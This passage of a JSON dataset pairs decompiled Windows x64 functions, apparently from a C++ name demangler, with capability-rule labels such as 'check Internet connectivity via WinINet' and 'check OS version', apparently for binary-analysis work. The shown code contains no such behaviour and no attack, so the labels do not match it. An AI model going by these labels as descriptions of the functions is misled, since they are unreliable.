= 0;\n                            *arg3 = 8;\n                            arg3[4] = iVar4;\n                            *(arg3 + 6) = piVar9;\n                            cVar3 = pcVar7[2];\n                            goto joined_r0x00014000c325;\n                        }\n                    }\n                    cVar3 = pcVar7[2];\n                    arg3 = NULL;\n                }\n                else {\ncode_r0x00014000c4fc:\n                    arg3 = NULL;\n                    pcVar8 = pcVar7;\n                }\n                goto joined_r0x00014000c325;\n            }\n        }\n        cVar3 = pcVar7[1];\n        if (cVar3 == 'I') {\n            pcVar8 = pcVar7 + 1;\n            *(arg1 + 0x18) = pcVar8;\n            cVar3 = pcVar7[2];\n            if (4 < cVar3 - 0x31U) {\n                cVar3 = pcVar7[1];\n                arg3 = NULL;\n                goto joined_r0x00014000c325;\n            }\n            *(arg1 + 0x18) = pcVar7 + 3;\n            fcn.14000b340(arg1);\n            piVar9 = *(arg1 + 0x40);\n            pcVar8 = *(arg1 + 0x18);\n        }\n        else {\n            if (4 < cVar3 - 0x31U) {\n                return NULL;\n            }\n            pcVar8 = pcVar7 + 2;\n            *(arg1 + 0x18) = pcVar8;\n        }\n        iVar4 = *(arg1 + 0x28);\n        if (iVar4 < *(arg1 + 0x2c)) {\n            arg3 = iVar4 * 0x20 + *(arg1 + 0x20);\n            *(arg3 + 1) = 0;\n            *(arg1 + 0x28) = iVar4 + 1;\n            if (piVar9 != NULL) {\n                *(arg3 + 1) = 0;\n                *arg3 = 7;\n                arg3[4] = cVar3 + -0x30;\n                *(arg3 + 6) = piVar9;\n                cVar3 = *pcVar8;\n                goto joined_r0x00014000c325;\n            }\n        }\n    }\n    else {\n        if (cVar3 == 'L') {\n            *(arg1 + 0x18) = pcVar7 + 1;\n            arg3 = fcn.14000aff0(arg1);\n            if (arg3 == NULL) {\n                return NULL;\n            }\n            iVar4 = fcn.14000a970(arg1);\n            if (iVar4 == 0) {\n                return NULL;\n            }\n            goto code_r0x00014000c20c;\n        }\n        if (cVar3 != 'U') {\n            return NULL;\n        }\n        if (pcVar7[1] == 'l') {\n            *(arg1 + 0x18) = pcVar7 + 1;\n            cVar3 = pcVar7[1];\n            if (cVar3 != 'l') goto code_r0x00014000c5d0;\n            *(arg1 + 0x18) = pcVar7 + 2;\n            iVar6 = fcn.14000be10(arg1);\n            pcVar7 = *(arg1 + 0x18);\n            cVar3 = *pcVar7;\n            if ((iVar6 == 0) || (cVar3 != 'E')) goto code_r0x00014000c47d;\n            pcVar10 = pcVar7 + 1;\n            *(arg1 + 0x18) = pcVar10;\n            if (pcVar7[1] == '_') {\n                iVar4 = 0;\n            }\n            else {\n                if (pcVar7[1] == 'n') {\n                    return NULL;\n                }\n                iVar4 = fcn.14000a7d0(arg1);\n                iVar4 = iVar4 + 1;\n                if (iVar4 < 0) goto code_r0x00014000c691;\n                pcVar10 = *(arg1 + 0x18);\n                cVar3 = *pcVar10;\n                if (cVar3 != '_') goto code_r0x00014000c6bb;\n            }\n            pcVar8 = pcVar10 + 1;\n            iVar2 = *(arg1 + 0x28);\n            *(arg1 + 0x18) = pcVar8;\n            if (iVar2 < *(arg1 + 0x2c)) {\n                arg3 = iVar2 * 0x20 + *(arg1 + 0x20);\n                *(arg3 + 1) = 0;\n                *(arg1 + 0x28) = iVar2 + 1;\n                *arg3 = 0x47;\n                *(arg3 + 4) = iVar6;\n                arg3[6] = iVar4;\n                cVar3 = pcVar10[1];\n                goto joined_r0x00014000c325;\n            }\ncode_r0x00014000c677:\n            cVar3 = pcVar10[1];\n            arg3 = NULL;\n            goto joined_r0x00014000c325;\n        }\n        if (pcVar7[1] != 't') {\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar7 + 1;\n        cVar3 = pcVar7[1];\n        if (cVar3 != 't') {\ncode_r0x00014000c5d0:\n            arg3 = NULL;\n            pcVar8 = pcVar7 + 1;\n            goto joined_r0x00014000c325;\n        }\n        pcVar10 = pcVar7 + 2;\n        *(arg1 + 0x18) = pcVar10;\n        if (pcVar7[2] == '_') {\n            iVar4 = 0;\ncode_r0x00014000c2b3:\n            pcVar8 = pcVar10 + 1;\n            iVar2 = *(arg1 + 0x28);\n            *(arg1 + 0x18) = pcVar8;\n            if (iVar2 < *(arg1 + 0x2c)) {\n                arg3 = iVar2 * 0x20 + *(arg1 + 0x20);\n                *(arg3 + 1) = 0;\n                *(arg1 + 0x28) = iVar2 + 1;\n                arg3[4] = iVar4;\n                iVar4 = *(arg1 + 0x38);\n                *arg3 = 0x49;\n                if (iVar4 < *(arg1 + 0x3c)) {\n                    *(*(arg1 + 0x30) + iVar4 * 8) = arg3;\n                    *(arg1 + 0x38) = iVar4 + 1;\n                    cVar3 = pcVar10[1];\n                    goto joined_r0x00014000c325;\n                }\n            }\n            goto code_r0x00014000c677;\n        }\n        if (pcVar7[2] == 'n') {\n            return NULL;\n        }\n        iVar4 = fcn.14000a7d0(arg1);\n        iVar4 = iVar4 + 1;\n        if (-1 < iVar4) {\n            pcVar10 = *(arg1 + 0x18);\n            cVar3 = *pcVar10;\n            if (cVar3 != '_') {\ncode_r0x00014000c6bb:\n                arg3 = NULL;\n                pcVar8 = pcVar10;\n                goto joined_r0x00014000c325;\n            }\n            goto code_r0x00014000c2b3;\n        }\ncode_r0x00014000c691:\n        pcVar8 = *(arg1 + 0x18);\n    }\n    cVar3 = *pcVar8;\n    arg3 = NULL;\njoined_r0x00014000c325:\n    if (cVar3 == 'B') {\n        uVar5 = *(arg1 + 0x40);\n        do {\n            *(arg1 + 0x18) = pcVar8 + 1;\n            arg4 = fcn.14000aff0(arg1);\n            arg3 = fcn.14000a670(arg1, 0x4d, arg3, arg4);\n            pcVar8 = *(arg1 + 0x18);\n        } while (*pcVar8 == 'B');\n        *(arg1 + 0x40) = uVar5;\n        return arg3;\n    }\n    return arg3;\n}\n",
        "token_count": 2958
    },
    "14000cbe": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuint32_t * fcn.14000cbe0(int64_t arg1)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    ulong *puVar3;\n    char **ppcVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint64_t uVar7;\n    uint32_t *puVar8;\n    uint32_t *puVar9;\n    ulong uVar10;\n    ulong uVar11;\n    int64_t iVar12;\n    uint32_t *arg3;\n    ulong arg4;\n    char cVar13;\n    char *pcVar14;\n    char *pcVar15;\n    uint32_t uVar16;\n    uint64_t arg3_00;\n    \n    pcVar15 = *(arg1 + 0x18);\n    cVar13 = *pcVar15;\n    if (cVar13 == 'L') {\n        pcVar15 = *(arg1 + 0x18);\n        if (*pcVar15 != 'L') {\n            return NULL;\n        }\n        pcVar14 = pcVar15 + 1;\n        *(arg1 + 0x18) = pcVar14;\n        if (pcVar15[1] == '_') {\n            pcVar14 = pcVar15 + 2;\n            puVar9 = NULL;\n            *(arg1 + 0x18) = pcVar14;\n            cVar13 = pcVar15[2];\n            if (cVar13 != 'Z') goto code_r0x00014000c7a9;\n        }\n        else if (pcVar15[1] != 'Z') {\n            puVar9 = fcn.14000b340(arg1);\n            if (puVar9 == NULL) {\n                return NULL;\n            }\n            pcVar14 = *(arg1 + 0x18);\n            pcVar15 = pcVar14;\n            if (*puVar9 == 0x27) {\n                puVar3 = *(puVar9 + 4);\n                if (*(puVar3 + 0x1c) != 0) {\n                    *(arg1 + 0x48) = *(arg1 + 0x48) - *(puVar3 + 1);\n                }\n                iVar6 = sub.msvcrt.dll_strcmp(*puVar3, \"decltype(nullptr)\");\n                cVar13 = *pcVar14;\n                if (iVar6 != 0) goto code_r0x00014000c71d;\n                if (cVar13 == 'E') {\n                    *(arg1 + 0x18) = pcVar14 + 1;\n                    return puVar9;\n                }\n                uVar7 = 0x3d;\n                if (cVar13 == 'n') goto code_r0x00014000c810;\ncode_r0x00014000c757:\n                do {\n                    pcVar14 = pcVar14 + 1;\n                    if (cVar13 == '\\0') {\n                        return NULL;\n                    }\n                    *(arg1 + 0x18) = pcVar14;\n                    cVar13 = *pcVar14;\n                } while (cVar13 != 'E');\n                arg3_00 = pcVar14 - pcVar15;\n            }\n            else {\n                cVar13 = *pcVar14;\ncode_r0x00014000c71d:\n                uVar7 = 0x3d;\n                if (cVar13 == 'n') {\ncode_r0x00014000c810:\n                    pcVar15 = pcVar14 + 1;\n                    uVar7 = 0x3e;\n                    *(arg1 + 0x18) = pcVar15;\n                    cVar13 = pcVar14[1];\n                }\n                pcVar14 = pcVar15;\n                if (cVar13 != 'E') goto code_r0x00014000c757;\n                arg3_00 = 0;\n            }\n            iVar12 = arg1;\n            uVar10 = fcn.14000a770(arg1, pcVar15, arg3_00);\n            puVar9 = fcn.14000a670(iVar12, uVar7 & 0xffffffff, puVar9, uVar10);\n            pcVar14 = *(arg1 + 0x18);\n            cVar13 = *pcVar14;\n            goto code_r0x00014000c7a9;\n        }\n        *(arg1 + 0x18) = pcVar14 + 1;\n        if ((pcVar14[1] == 'G') || (pcVar14[1] == 'T')) {\n            puVar9 = fcn.14000d6b0(arg1);\n            pcVar14 = *(arg1 + 0x18);\n            cVar13 = *pcVar14;\n        }\n        else {\n            puVar9 = fcn.14000e120(arg1, 0);\n            pcVar14 = *(arg1 + 0x18);\n            cVar13 = *pcVar14;\n        }\ncode_r0x00014000c7a9:\n        if (cVar13 != 'E') {\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar14 + 1;\n        return puVar9;\n    }\n    if (cVar13 == 'T') {\n        pcVar15 = *(arg1 + 0x18);\n        if (*pcVar15 != 'T') {\n            return NULL;\n        }\n        pcVar14 = pcVar15 + 1;\n        *(arg1 + 0x18) = pcVar14;\n        if (pcVar15[1] == '_') {\n            uVar16 = 0;\n        }\n        else {\n            if (pcVar15[1] == 'n') {\n                return NULL;\n            }\n            iVar6 = fcn.14000a7d0(arg1);\n            uVar16 = iVar6 + 1;\n            if (uVar16 < 0) {\n                return NULL;\n            }\n            pcVar14 = *(arg1 + 0x18);\n            if (*pcVar14 != '_') {\n                return NULL;\n            }\n        }\n        *(arg1 + 0x18) = pcVar14 + 1;\n        iVar6 = *(arg1 + 0x28);\n        if (iVar6 < *(arg1 + 0x2c)) {\n            puVar9 = iVar6 * 0x20 + *(arg1 + 0x20);\n            *(puVar9 + 1) = 0;\n            *(arg1 + 0x28) = iVar6 + 1;\n            *puVar9 = 5;\n            puVar9[4] = uVar16;\n            return puVar9;\n        }\n        return NULL;\n    }\n    if (cVar13 == 's') {\n        if (pcVar15[1] != 'r') {\n            if (pcVar15[1] == 'p') {\n                *(arg1 + 0x18) = pcVar15 + 2;\n                puVar9 = fcn.14000cbe0(arg1);\n                arg3 = NULL;\n                uVar16 = 0x4c;\n                goto code_r0x00014000cf6e;\n            }\n            goto code_r0x00014000cc74;\n        }\n        *(arg1 + 0x18) = pcVar15 + 2;\n        uVar2 = pcVar15[2];\n        if (*(arg1 + 0x54) == 0) {\ncode_r0x00014000d1a5:\n            puVar9 = fcn.14000b340(arg1);\n        }\n        else {\n            if (uVar2 < ':') {\n                if (uVar2 < '0') goto code_r0x00014000d1a5;\n            }\n            else if ((0x37 < uVar2 - 0x43) || ((0xffffffc0040201U >> (uVar2 - 0x43 & 0x3f) & 1) == 0))\n            goto code_r0x00014000d1a5;\n            *(arg1 + 0x54) = 0xffffffff;\n            puVar9 = fcn.14000ca00(arg1, 0);\n            if (**(arg1 + 0x18) == 'E') {\n                *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            }\n        }\n        arg3 = fcn.14000c1c0(arg1);\n        if (**(arg1 + 0x18) == 'I') {\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            uVar10 = fcn.14000c950(arg1);\n            arg3 = fcn.14000a670(arg1, 4, arg3, uVar10);\n        }\n        uVar16 = 1;\n    }\n    else if (cVar13 == 'f') {\n        if (pcVar15[1] == 'p') {\n            *(arg1 + 0x18) = pcVar15 + 2;\n            cVar13 = pcVar15[2];\n            if (cVar13 == 'T') {\n                *(arg1 + 0x18) = pcVar15 + 3;\n                uVar16 = 0;\n            }\n            else if (cVar13 == '_') {\n                *(arg1 + 0x18) = pcVar15 + 3;\n                uVar16 = 1;\n            }\n            else {\n                if (cVar13 == 'n') {\n                    return NULL;\n                }\n                iVar6 = fcn.14000a7d0(arg1);\n                if (iVar6 + 1 < 0) {\n                    return NULL;\n                }\n                if (**(arg1 + 0x18) != '_') {\n                    return NULL;\n                }\n                *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                if (iVar6 + 1 == 0x7fffffff) {\n                    return NULL;\n                }\n                uVar16 = iVar6 + 2;\n            }\n            iVar6 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar6) {\n                return NULL;\n            }\n            puVar9 = iVar6 * 0x20 + *(arg1 + 0x20);\n            *(puVar9 + 1) = 0;\n            *(arg1 + 0x28) = iVar6 + 1;\n            *puVar9 = 6;\n            puVar9[4] = uVar16;\n            return puVar9;\n        }\ncode_r0x00014000cc74:\n        puVar9 = fcn.14000c020(arg1);\n        if (puVar9 == NULL) {\n            return NULL;\n        }\n        uVar16 = *puVar9;\n        if (uVar16 == 0x32) {\n            ppcVar4 = *(puVar9 + 4);\n            pcVar15 = *ppcVar4;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + *(ppcVar4 + 2) + -2;\n            cVar13 = *pcVar15;\n            if (((cVar13 == 's') && (pcVar15[1] == 't')) && (pcVar15[2] == '\\0')) {\n                arg3 = fcn.14000b340(arg1);\n                uVar16 = 0x37;\n                goto code_r0x00014000cf6e;\n            }\n            uVar16 = *(ppcVar4 + 0x14);\n            if (uVar16 != 1) {\n                if (uVar16 < 2) goto joined_r0x00014000ceca;\n                if (uVar16 == 2) {\n                    cVar1 = *pcVar15;\n                    if ((pcVar15[1] == 'c') && ((cVar1 + 0x9dU < 2 || (cVar1 + 0x8eU < 2)))) {\n                        uVar10 = fcn.14000b340(arg1);\n                    }\n                    else if (cVar1 == 'f') {\n                        uVar10 = fcn.14000c020(arg1);\n                    }\n                    else if (((cVar13 == 'd') && (pcVar15[1] == 'i')) && (pcVar15[2] == '\\0')) {\n                        uVar10 = fcn.14000c1c0(arg1);\n                    }\n                    else {\n                        uVar10 = fcn.14000cbe0(arg1);\n                    }\n                    cVar13 = *pcVar15;\n                    if (((cVar13 == 'c') && (pcVar15[1] == 'l')) && (pcVar15[2] == '\\0')) {\n                        uVar11 = fcn.14000d3c0(arg1, 0x45);\n                    }\n                    else {\n                        if ((((cVar13 == 'd') && (pcVar15[1] == 't')) && (pcVar15[2] == '\\0')) ||\n                           (((cVar13 == 'p' && (pcVar15[1] == 't')) && (pcVar15[2] == '\\0')))) {\n                            pcVar15 = *(arg1 + 0x18);\n                            if (*pcVar15 == 'g') {\n                                if (pcVar15[1] != 's') goto code_r0x00014000d20c;\n                            }\n                            else if ((*pcVar15 != 's') || (pcVar15[1] != 'r')) {\ncode_r0x00014000d20c:\n                                uVar11 = fcn.14000c1c0(arg1);\n                                if (**(arg1 + 0x18) == 'I') {\n                                    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                                    arg4 = fcn.14000c950(arg1);\n                                    uVar11 = fcn.14000a670(arg1, 4, uVar11, arg4);\n                                }\n                                goto code_r0x00014000d02e;\n                            }\n                        }\n                        uVar11 = fcn.14000cbe0(arg1);\n                    }\ncode_r0x00014000d02e:\n                    arg3 = fcn.14000a670(arg1, 0x39, uVar10, uVar11);\n                    uVar16 = 0x38;\n                    goto code_r0x00014000cf6e;\n                }\n                if (uVar16 != 3) {\n                    return NULL;\n                }\n                if ((((cVar13 == 'q') && (pcVar15[1] == 'u')) && (pcVar15[2] == '\\0')) ||\n                   (((cVar13 == 'd' && (pcVar15[1] == 'X')) && (pcVar15[2] == '\\0')))) {\n                    uVar10 = fcn.14000cbe0(arg1);\ncode_r0x00014000cdf2:\n                    uVar11 = fcn.14000cbe0(arg1);\n                    iVar12 = fcn.14000cbe0(arg1);\n                    if (iVar12 == 0) {\n                        return NULL;\n                    }\n                }\n                else {\n                    if (*pcVar15 == 'f') {\n                        uVar10 = fcn.14000c020(arg1);\n                        goto code_r0x00014000cdf2;\n                    }\n                    if (*pcVar15 != 'n') {\n                        return NULL;\n                    }\n                    if ((pcVar15[1] != 'w') && (pcVar15[1] != 'a')) {\n                        return NULL;\n                    }\n                    uVar10 = fcn.14000d3c0(arg1, 0x5f);\n                    uVar11 = fcn.14000b340(arg1);\n                    pcVar15 = *(arg1 + 0x18);\n                    cVar13 = *pcVar15;\n                    if (cVar13 == 'E') {\n                        iVar12 = 0;\n                        *(arg1 + 0x18) = pcVar15 + 1;\n                    }\n                    else if (cVar13 == 'p') {\n                        if (pcVar15[1] != 'i') {\n                            return NULL;\n                        }\n                        *(arg1 + 0x18) = pcVar15 + 2;\n                        iVar12 = fcn.14000d3c0(arg1, 0x45);\n                    }\n                    else {\n                        if (cVar13 != 'i') {\n                            return NULL;\n                        }\n                        if (pcVar15[1] != 'l') {\n                            return NULL;\n                        }\n                        iVar12 = fcn.14000cbe0(arg1);\n                    }\n                }\n                uVar11 = fcn.14000a670(arg1, 0x3c, uVar11, iVar12);\n                arg3 = fcn.14000a670(arg1, 0x3b, uVar10, uVar11);\n                uVar16 = 0x3a;\n                goto code_r0x00014000cf6e;\n            }\n            cVar1 = *pcVar15;\n            if (((cVar1 == 'p') || (cVar1 == 'm')) && (cVar1 == pcVar15[1])) {\n                if (**(arg1 + 0x18) == '_') {\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                    cVar13 = *pcVar15;\n                    goto code_r0x00014000cef5;\n                }\n            }\n            else {\ncode_r0x00014000cef5:\n                uVar16 = 0;\n            }\n            if (((cVar13 == 's') && (pcVar15[1] == 'P')) && (pcVar15[2] == '\\0')) {\n                arg3 = fcn.14000c950(arg1);\n            }\n            else {\n                arg3 = fcn.14000cbe0(arg1);\n            }\n            if (uVar16 != 0) {\n                arg3 = fcn.14000a670(arg1, 0x39, arg3, arg3);\n            }\n        }\n        else {\n            if (uVar16 == 0x33) {\n                uVar16 = puVar9[4];\n                if (uVar16 != 1) {\n                    if (uVar16 == 3) {\n                        return NULL;\n                    }\njoined_r0x00014000ceca:\n                    if (uVar16 != 0) {\n                        return NULL;\n                    }\n                    arg3 = NULL;\n                    uVar16 = 0x36;\n                    goto code_r0x00014000cf6e;\n                }\n            }\n            else {\n                if (uVar16 != 0x34) {\n                    return NULL;\n                }\n                if (**(arg1 + 0x18) == '_') {\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                    arg3 = fcn.14000d3c0(arg1, 0x45);\n                    goto code_r0x00014000cf36;\n                }\n            }\n            arg3 = fcn.14000cbe0(arg1);\n        }\ncode_r0x00014000cf36:\n        uVar16 = 0x37;\n    }\n    else {\n        if (9 < cVar13 - 0x30U) {\n            if (cVar13 != 'o') {\n                if ((cVar13 == 'i') || (cVar13 == 't')) {\n                    if (pcVar15[1] != 'l') goto code_r0x00014000cc74;\n                    pcVar15 = pcVar15 + 2;\n                    puVar9 = NULL;\n                    *(arg1 + 0x18) = pcVar15;\n                    if (cVar13 == 't') {\n                        puVar9 = fcn.14000b340(arg1);\n                        pcVar15 = *(arg1 + 0x18);\n                    }\n                    if (*pcVar15 == '\\0') {\n                        return NULL;\n                    }\n                    if (pcVar15[1] == '\\0') {\n                        return NULL;\n                    }\n                    arg3 = fcn.14000d3c0(arg1, 0x45);\n                    uVar16 = 0x31;\n                }\n                else {\n                    if (cVar13 != 'u') goto code_r0x00014000cc74;\n                    *(arg1 + 0x18) = pcVar15 + 1;\n                    puVar9 = fcn.14000aff0(arg1);\n                    arg3 = fcn.14000c950(arg1);\n                    uVar16 = 0x3f;\n                }\n                goto code_r0x00014000cf6e;\n            }\n            if (pcVar15[1] != 'n') goto code_r0x00014000cc74;\n            *(arg1 + 0x18) = pcVar15 + 2;\n        }\n        puVar9 = fcn.14000c1c0(arg1);\n        if (puVar9 == NULL) {\n            return NULL;\n        }\n        if (**(arg1 + 0x18) != 'I') {\n            return puVar9;\n        }\n        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n        arg3 = fcn.14000c950(arg1);\n        uVar16 = 4;\n    }\ncode_r0x00014000cf6e:\n    puVar8 = arg3;\n    puVar5 = puVar9;\n    if (uVar16 < 0x32) {\n        if (0x28 < uVar16) {\n            switch(uVar16) {\n            case 0x29:\n            case 0x2e:\n            case 0x2f:\n                goto code_r0x00014000a6a8;\n            case 0x2b:\n            case 0x2d:\ncode_r0x00014000a74f:\n                if (puVar9 == NULL) {\n                    return NULL;\n                }\n            case 0x2a:\n            case 0x31:\njoined_r0x00014000a703:\n                puVar5 = puVar8;\n                break;\n            default:\n                goto code_r0x00014000a707;\n            case 0x30:\n                break;\n            }\n            goto joined_r0x00014000a6a1;\n        }\n        uVar7 = 1 << (uVar16 & 0x3f);\n        if ((uVar7 & 0x17c00fff600) != 0) goto joined_r0x00014000a6a1;\n        if ((uVar7 & 0x1fe000000) == 0) {\n            if ((uVar7 & 0x20000081e) == 0) {\n                return NULL;\n            }\n            goto code_r0x00014000a74f;\n        }\n    }\n    else {\n        if (0x1d < uVar16 - 0x34) {\n            return NULL;\n        }\n        uVar7 = 1 << (uVar16 - 0x34 & 0x3f);\n        if ((uVar7 & 0x1c71107) == 0) {\n            if ((uVar7 & 0xa002ef8) != 0) goto code_r0x00014000a74f;\n            puVar8 = uVar7 & 0x34000000;\n            goto joined_r0x00014000a703;\n        }\njoined_r0x00014000a6a1:\n        if (puVar5 == NULL) {\n            return NULL;\n        }\n    }\ncode_r0x00014000a6a8:\n    iVar6 = *(arg1 + 0x28);\n    if (iVar6 < *(arg1 + 0x2c)) {\n        puVar8 = iVar6 * 0x20 + *(arg1 + 0x20);\n        *(puVar8 + 1) = 0;\n        *(arg1 + 0x28) = iVar6 + 1;\n        *puVar8 = uVar16;\n        *(puVar8 + 4) = puVar9;\n        *(puVar8 + 6) = arg3;\n        return puVar8;\n    }\ncode_r0x00014000a707:\n    return NULL;\n}\n",
        "token_count": 5388
    },
    "14000d47": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t ** fcn.14000d470(int64_t arg1, int32_t **arg2, ulong arg3)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int64_t arg4;\n    char *arg1_00;\n    uint64_t arg2_00;\n    int32_t **ppiVar5;\n    char cVar6;\n    \n    arg1_00 = *(arg1 + 0x18);\n    cVar6 = *arg1_00;\n    ppiVar5 = arg2;\n    do {\n        iVar3 = fcn.14000abf0(arg1_00);\n        if (iVar3 == 0) {\n            if (((arg3 & 1) == 0) && (cVar6 == 'F')) {\n                while (ppiVar5 != arg2) {\n                    piVar4 = *arg2;\n                    iVar3 = *piVar4;\n                    if (iVar3 == 0x1a) {\n                        *piVar4 = 0x1d;\n                    }\n                    else if (iVar3 == 0x1b) {\n                        *piVar4 = 0x1e;\n                    }\n                    else if (iVar3 == 0x19) {\n                        *piVar4 = 0x1c;\n                    }\n                    arg2 = piVar4 + 4;\n                }\n            }\n            return ppiVar5;\n        }\n        *(arg1 + 0x18) = arg1_00 + 1;\n        if (cVar6 == 'r') {\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 9;\n            arg2_00 = (-(arg3 == 0) & 0xfffffffd) + 0x1c;\n            arg4 = 0;\n        }\n        else if (cVar6 == 'V') {\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 9;\n            arg2_00 = (-(arg3 == 0) & 0xfffffffd) + 0x1d;\n            arg4 = 0;\n        }\n        else if (cVar6 == 'K') {\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 6;\n            arg2_00 = (-(arg3 == 0) & 0xfffffffd) + 0x1e;\n            arg4 = 0;\n        }\n        else {\n            if (arg1_00[1] == '\\0') {\n                return NULL;\n            }\n            *(arg1 + 0x18) = arg1_00 + 2;\n            uVar1 = arg1_00[1];\n            if (uVar1 == 0x78) {\n                *(arg1 + 0x48) = *(arg1 + 0x48) + 0x11;\n                arg4 = 0;\n                arg2_00 = 0x4e;\n            }\n            else if ((uVar1 & 0xdf) == 0x4f) {\n                *(arg1 + 0x48) = *(arg1 + 0x48) + 9;\n                arg4 = 0;\n                arg2_00 = 0x50;\n                if (uVar1 == 0x4f) {\n                    uVar2 = *(arg1 + 0x4c);\n                    *(arg1 + 0x4c) = 1;\n                    arg4 = fcn.14000cbe0(arg1);\n                    *(arg1 + 0x4c) = uVar2;\n                    if (arg4 == 0) {\n                        return NULL;\n                    }\n                    if (**(arg1 + 0x18) != 'E') {\n                        return NULL;\n                    }\n                    arg2_00 = 0x50;\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                }\n            }\n            else {\n                if (uVar1 != 0x77) {\n                    return NULL;\n                }\n                *(arg1 + 0x48) = *(arg1 + 0x48) + 6;\n                arg4 = fcn.14000be10(arg1);\n                if (arg4 == 0) {\n                    return NULL;\n                }\n                if (**(arg1 + 0x18) != 'E') {\n                    return NULL;\n                }\n                arg2_00 = 0x51;\n                *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            }\n        }\n        piVar4 = fcn.14000a670(arg1, arg2_00, 0, arg4);\n        *ppiVar5 = piVar4;\n        if (piVar4 == NULL) {\n            return NULL;\n        }\n        arg1_00 = *(arg1 + 0x18);\n        ppiVar5 = piVar4 + 4;\n        cVar6 = *arg1_00;\n    } while( true );\n}\n",
        "token_count": 1123
    },
    "14000d6b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t * fcn.14000d6b0(int64_t arg1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    uint *puVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t *puVar8;\n    uint *arg4;\n    uint *puVar9;\n    uint32_t uVar10;\n    uint64_t arg3;\n    uint64_t uVar11;\n    char *arg2;\n    \n    iVar6 = *(arg1 + 0x48);\n    *(arg1 + 0x48) = iVar6 + 0x14;\n    pcVar3 = *(arg1 + 0x18);\n    if (*pcVar3 == 'T') {\n        *(arg1 + 0x18) = pcVar3 + 1;\n        if (pcVar3[1] == '\\0') {\ncode_r0x00014000d852:\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar3 + 2;\n        if (0x35 < pcVar3[1] + 0xbfU) {\n            return NULL;\n        }\n    // switch table (54 cases) at 0x14010c5b4\n        switch(*((pcVar3[1] + 0xbfU) * 4 + 0x14010c5b4) + 0x14010c5b4) {\n        case 0x14000d852:\n            goto code_r0x00014000d852;\n        case 0x14000d9da:\n            arg4 = fcn.14000b340(arg1);\n            puVar9 = NULL;\n            uVar10 = 0xc;\n            break;\n        case 0x14000d9f2:\n            arg4 = fcn.14000b340(arg1);\n            puVar9 = NULL;\n            uVar10 = 0xe;\n            break;\n        case 0x14000da0a:\n            puVar9 = fcn.14000b340(arg1);\n            iVar6 = fcn.14000a7d0(arg1);\n            if (iVar6 < 0) {\n                return NULL;\n            }\n            if (**(arg1 + 0x18) != '_') {\n                return NULL;\n            }\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            arg4 = fcn.14000b340(arg1);\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 5;\n            uVar10 = 0xb;\n            break;\n        case 0x14000da56:\n            arg4 = fcn.14000dcb0(arg1);\n            puVar9 = NULL;\n            uVar10 = 0x14;\n            break;\n        case 0x14000da6e:\n            arg4 = fcn.14000c8b0(arg1);\n            puVar9 = NULL;\n            uVar10 = 0x30;\n            break;\n        case 0x14000da86:\n            iVar6 = fcn.14000a890(arg1, 0x76);\n            if (iVar6 == 0) {\n                return NULL;\n            }\n            if ((**(arg1 + 0x18) == 'G') || (**(arg1 + 0x18) == 'T')) {\n                arg4 = fcn.14000d6b0(arg1);\n            }\n            else {\n                arg4 = fcn.14000e120(arg1, 0);\n            }\n            puVar9 = NULL;\n            uVar10 = 0x10;\n            break;\n        case 0x14000dacc:\n            iVar6 = fcn.14000a890(arg1, 0x68);\n            if (iVar6 == 0) {\n                return NULL;\n            }\n            if ((**(arg1 + 0x18) == 'G') || (**(arg1 + 0x18) == 'T')) {\n                arg4 = fcn.14000d6b0(arg1);\n            }\n            else {\n                arg4 = fcn.14000e120(arg1, 0);\n            }\n            puVar9 = NULL;\n            uVar10 = 0xf;\n            break;\n        case 0x14000db12:\n            iVar6 = fcn.14000a890(arg1, 0);\n            if (iVar6 == 0) {\n                return NULL;\n            }\n            iVar6 = fcn.14000a890(arg1, 0);\n            if (iVar6 == 0) {\n                return NULL;\n            }\n            if ((**(arg1 + 0x18) == 'G') || (**(arg1 + 0x18) == 'T')) {\n                arg4 = fcn.14000d6b0(arg1);\n            }\n            else {\n                arg4 = fcn.14000e120(arg1, 0);\n            }\n            puVar9 = NULL;\n            uVar10 = 0x11;\n            break;\n        case 0x14000db67:\n            arg4 = fcn.14000dcb0(arg1);\n            puVar9 = NULL;\n            uVar10 = 0x15;\n            break;\n        case 0x14000db7f:\n            *(arg1 + 0x48) = iVar6 + 0xf;\n            arg4 = fcn.14000b340(arg1);\n            